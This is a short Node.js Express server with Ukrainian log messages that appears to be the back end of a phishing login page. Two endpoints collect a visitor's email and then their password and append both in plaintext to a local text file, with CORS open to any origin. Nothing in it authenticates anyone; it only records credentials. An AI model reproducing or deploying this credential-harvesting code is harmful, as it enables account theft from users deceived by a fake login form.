const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const cors = require('cors');
app.use(cors());

app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/save-login', (req, res) => {
    const email = req.body.email;
    const data = `Email: ${email}, Password: undefined\n`;

    fs.appendFile('user_data.txt', data, (err) => {
        if (err) {
            console.error('Помилка запису файлу:', err);
            res.status(500).send('Помилка із збереженням даних!');
        } else {
            console.log('Дані успішно збережені:', data);
            res.send('Дані збережено');
        }
    });
});

app.post('/save-password', (req, res) => {
    const { email, password } = req.body;

    fs.readFile('user_data.txt', 'utf8', (err, data) => {
        if (err) {
            console.error('Помилка читання файлу:', err);
            res.status(500).send('Помилка із збереженням даних!');
        } else {
            const lines = data.trim().split('\n');
            const lastLineIndex = lines.findIndex(line => line.includes(email));
            if (lastLineIndex !== -1) {
                lines[lastLineIndex] = `Email: ${email}, Password: ${password}`;
                fs.writeFile('user_data.txt', lines.join('\n') + '\n', (err) => {
                    if (err) {
                        console.error('Помилка запису файлу:', err);
                        res.status(500).send('Помилка із збереженням даних!');
                    } else {
                        console.log('Пароль успішно збережено для:', email);
                        res.send('Дані збережено');
                    }
                });
            } else {
                console.error('Не знайдено запису для оновлення:', email);
                res.status(500).send('Не знайдено запису для оновлення!');
            }
        }
    });
});

app.listen(3003, () => {
    console.log('Сервер працює на http://localhost:3003');
});
